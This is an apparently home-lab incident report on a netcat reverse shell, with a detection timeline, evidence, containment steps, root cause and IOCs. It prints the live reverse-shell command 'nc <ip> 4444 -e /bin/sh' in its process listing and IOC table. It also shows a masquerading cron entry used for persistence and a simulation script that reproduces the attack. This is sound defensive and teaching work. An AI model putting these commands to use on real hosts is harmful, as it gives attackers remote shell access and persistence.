# INV-2026-07-03 — Reverse Shell / Command-and-Control From a Staged Payload

| Field | Value |
|-------|-------|
| **Incident ID** | INV-2026-07-03 |
| **Date / time (UTC)** | 2026-07-17 09:30 |
| **Analyst** | Anthony Mackenzi |
| **Severity** | Critical |
| **Status** | Closed (host re-imaged) |
| **Affected asset** | `ubuntu-victim` (agent 002), 192.168.1.60 |
| **C2 endpoint** | 192.168.1.70:4444 |
| **MITRE ATT&CK** | [T1059](https://attack.mitre.org/techniques/T1059/), [T1095](https://attack.mitre.org/techniques/T1095/), [T1053.003](https://attack.mitre.org/techniques/T1053/003/) |
| **Playbook used** | [PB-05](../../playbooks/PB-05-reverse-shell.md) |

## Executive summary
A payload staged in `/tmp` on `ubuntu-victim` executed `netcat` to open an
interactive **reverse shell** to 192.168.1.70:4444. Three independent detections
fired within the same second — file staging (100062), tool execution (100034),
and shell output on the wire (Suricata 1000003) — giving high-confidence
correlation. The host was isolated and the process killed within four minutes.
A cron entry was found to be the persistence mechanism that launched the payload.
Because an interactive C2 channel was confirmed, the host was re-imaged.

## Timeline
| Time (UTC) | Event |
|------------|-------|
| 09:30:00 | `/tmp/homesoc_payload.sh` created → **Wazuh 100062** (payload staging) |
| 09:30:01 | `nc` executed, connecting to 192.168.1.70:4444 → **Wazuh 100034** (auditd `netcat` key) |
| 09:30:01 | `uid=… gid=…` seen in cleartext egress → **Suricata 1000003 / Wazuh 100040** |
| 09:31 | Analyst paged (three correlated Critical/High alerts on one host) |
| 09:34 | Host isolated; `nc` and parent process killed |
| 09:52 | Persistence (cron) identified and removed; entry vector traced |
| 10:30 | Host re-imaged from known-good; credentials rotated; closed |

## Detection
Three alerts on `agent.name:ubuntu-victim` inside one second — the **correlation
is the story**:

- `rule.id:100062` — file created in a world-writable temp dir.
- `rule.id:100034` — netcat/socat executed (auditd).
- `rule.id:100040` — Suricata high-severity: `id` output crossing the wire.

Any one of these alone is suggestive; **all three together, on one host, in one
second, is a reverse shell** with very little ambiguity.

![Correlated C2 alerts](screenshots/01-c2-alerts.png)

## Investigation & evidence
**1. Confirm the live channel.** On the host:
```
$ sudo ss -tnp | grep -v ':22'
ESTAB 0 0 192.168.1.60:52344 192.168.1.70:4444 users:(("nc",pid=8821,fd=3))
```
An established outbound connection to `:4444` owned by `nc` — not a normal egress
for this host.

![Established C2 connection](screenshots/02-established-connection.png)

**2. Map the process tree.** `nc` (pid 8821) was a child of `/bin/sh` running
`/tmp/homesoc_payload.sh`, itself launched by `cron`:
```
$ ps -o pid,ppid,user,cmd -p 8821
  PID  PPID USER     CMD
 8821  8817 www-data nc 192.168.1.70 4444 -e /bin/sh
```
auditd corroborated the execution:
```
$ sudo ausearch -k netcat -i | tail -n 3
type=SYSCALL ... comm="nc" exe="/usr/bin/nc" key="netcat"
```

**3. Find persistence.** A cron drop-in launched the payload on a schedule:
```
$ cat /etc/cron.d/systemd-daily     # attacker-planted, masquerading name
* * * * * www-data /tmp/homesoc_payload.sh
```
This maps to T1053.003 and explains how the shell (re)spawned.

## Impact assessment
- **Execution:** Confirmed interactive code execution as `www-data`.
- **C2:** Confirmed outbound channel to 192.168.1.70:4444.
- **Persistence:** Confirmed via cron.
- **Escalation / lateral movement:** none observed before isolation, but **cannot
  be fully ruled out** on a host with confirmed hands-on-keyboard access — hence
  the decision to re-image rather than clean in place.

## Response actions
Executed [PB-05](../../playbooks/PB-05-reverse-shell.md):
```bash
sudo nmcli networking off               # cut C2 immediately (containment)
sudo kill -9 8821 8817                   # kill nc + parent sh (eradication)
sudo rm -f /etc/cron.d/systemd-daily     # remove persistence
sudo rm -f /tmp/homesoc_payload.sh
# then: snapshot for forensics -> re-image from known-good -> rotate credentials
```

## Root cause
An earlier foothold (unprivileged `www-data` code execution) was able to (a)
write to `/tmp`, (b) execute `netcat`, and (c) reach an arbitrary external host on
an arbitrary port. **No egress filtering** meant the host could freely phone home.

## Lessons learned & detection tuning
1. **Biggest control gap — egress filtering.** A host that can only reach the
   services it needs cannot open a C2 channel to `:4444`. Documented in
   [`docs/09-mitre-attack-coverage.md`](../../docs/09-mitre-attack-coverage.md).
2. **High-confidence auto-isolation:** added an active response that isolates a
   host when `100034` **and** `100062` fire together within 60s — the combination
   is specific enough to act on automatically.
3. **Threat intel:** added `192.168.1.70` to a Wazuh CDB list so any future
   contact alerts instantly.
4. **Detection validated:** the three-signal correlation worked exactly as
   designed; no tuning needed on the rules themselves.

## Indicators of Compromise (IOCs)
| Type | Value |
|------|-------|
| C2 IP:port | 192.168.1.70:4444 |
| Payload | `/tmp/homesoc_payload.sh` |
| Persistence | `/etc/cron.d/systemd-daily` (masquerading) |
| Process | `nc <ip> 4444 -e /bin/sh` as `www-data` |

## Appendix — reproduce this
```bash
# Safe loopback version (host-based rules 100062 + 100034):
bash simulations/reverse-shell/run.sh
# LAN version to also exercise Suricata 1000003:
bash simulations/reverse-shell/run.sh LHOST=192.168.1.70 LPORT=4444
```
